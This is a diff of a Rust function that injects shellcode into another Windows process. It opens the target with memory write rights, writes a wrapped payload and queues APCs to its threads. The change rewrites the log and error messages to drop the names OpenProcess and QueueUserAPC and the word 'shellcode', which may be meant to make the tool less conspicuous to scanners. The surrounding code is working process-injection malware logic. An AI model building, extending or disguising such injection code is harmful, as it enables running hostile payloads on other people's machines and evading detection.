@@ -29,22 +29,19 @@ pub fn live_inject(
         dw_flags: u32,
     }
 
-    log.step(format!(
-        "[1/5] OpenProcess(PID {}) — PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
-        pid
-    ));
+    log.step(format!("[1/5] Open target (PID {})", pid));
     let process_access =
         PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
     let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
     if process.is_null() {
-        return Err("OpenProcess failed (check privileges — try from an elevated shell)".to_string());
+        return Err("process open failed (check privileges — try from an elevated shell)".to_string());
     }
 
     let wrapped = wrap_for_apc(shellcode);
     let size = wrapped.len();
     let base = write_remote_payload(process, &wrapped, 5, log)?;
 
-    log.step("[5/5] QueueUserAPC — enumerating threads and queuing APCs");
+    log.step("[5/5] Enumerating threads and queuing APCs");
 
     let snapshot = unsafe { resolve::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
     let invalid_handle = -1isize as *mut std::ffi::c_void;
@@ -101,9 +98,9 @@ pub fn live_inject(
         "      APCs queued to {}/{} threads",
         queued, total
     ));
-    log.warning("      shellcode executes when a thread enters alertable wait (async)");
+    log.info("      executes when a thread enters alertable wait (async)");
     log.info(format!(
-        "      shellcode at remote address {:#p} ({} bytes, wrapped {}+38)",
+        "      payload at {:#p} ({} bytes, wrapped {}+38)",
         base,
         size,
         size - 38
@@ -120,5 +117,5 @@ pub fn live_inject(
     _shellcode: &[u8],
     _log: &LogSink,
 ) -> Result<InjectionResult, String> {
-    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
+    Err("requires Windows".to_string())
 }
